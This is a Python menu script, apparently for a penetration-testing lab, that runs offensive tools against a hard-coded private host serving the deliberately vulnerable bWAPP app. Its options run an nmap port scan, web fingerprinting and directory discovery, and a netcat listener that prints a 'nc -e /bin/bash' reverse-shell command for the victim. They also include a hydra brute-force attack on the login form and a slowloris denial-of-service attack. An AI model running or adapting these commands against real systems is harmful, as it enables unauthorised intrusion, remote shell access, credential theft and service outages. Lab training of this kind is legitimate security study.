import os


def menu():
    '''Print options to choose from the menu'''

    print('JobAutoMate v1.0\n Mateusz Kuboszek\n\n')
    print('Script made for daily job automate tasks used in work\n\n')
    print('[1] Search for open ports using Nmap')
    print('[2] Identify the website using whatweb')
    print('[3] Scrap the webpage to file using skipfish')
    print('[4] File / URL searching wit dirb')
    print('[5] NETCAT RAT Attack (reverse shell)')
    print('[6] Bruteforce attack with hydra')
    print('[7] DOS attack with slowloris')
    print('\n[0] EXIT')



def nmap():
    '''nmap function'''

    print('\n\n\nI will scan the device 192.168.191.129 for open ports')
    cmd = 'nmap -p 1-8888 192.168.191.129'
    os.system(cmd)

def whatweb():
    '''whatweb function'''

    print('\n\n\nI will scan the device 192.168.191.129 and identify server')
    cmd = 'whatweb -a 1 192.168.191.129'
    os.system(cmd)

def skipfish():
    '''skipfish function'''

    print('\n\n\nI will scan the device 192.168.191.129 and prepare the sitemap')
    cmd = 'skipfish -o Victim_Page http://192.168.191.129/bWAPP'
    os.system(cmd)

def dirb():
    '''dirb function'''

    print('\n\n\nI will scan the website 192.168.191.129 for direct URLs. \n\n\nThe output is saving in dirb_output.txt')
    cmd = 'dirb  http://192.168.191.129/bWAPP -w > dirb_output.txt'
    print('Please wait')
    os.system(cmd)

def netcat():
    '''Rat attack function'''

    print('\n\n\nI will execute the listen command and waiting for host 192.168.191.129 connection')
    cmd = 'nc -lnvp 87 -s 192.168.191.130'
    print(f"run nc -e /bin/bash 192.168.191.130 87 on the victim host")
    os.system(cmd)

def hydra():
    '''Bruteforce attack function'''

    print('\n\n\nI will bruteforce credentials on host 192.168.191.129 using usernames.txt and passwords.txt files')
    cmd = 'hydra 192.168.191.129 http-form-post "/bWAPP/login.php:login=^USER^&password=^PASS^&form=submit:Invalid credentials or user not activated" -L usernames.txt -P passwords.txt'
    os.system(cmd)

def slowloris():
    '''DoS attack function'''

    print('\n\n\nThe target od DoS attack will be 192.168.191.129 host')
    cmd = 'slowloris 192.168.191.129'
    os.system(cmd)

menu()
option = int(input('\nEnter your option: '))

while option != 0:
    if option == 1:
        nmap()

    elif option == 2:
        whatweb()

    elif option == 3:
        skipfish()

    elif option == 4:
        dirb()

    elif option == 5:
        netcat()

    elif option == 6:
        hydra()

    elif option == 7:
        slowloris()

    elif option == 0:
        break

    else:
        print('Invalid option')

    print()
    menu()
    option = int(input('Enter your option: '))

print('\n\n\nThank you for using the program')

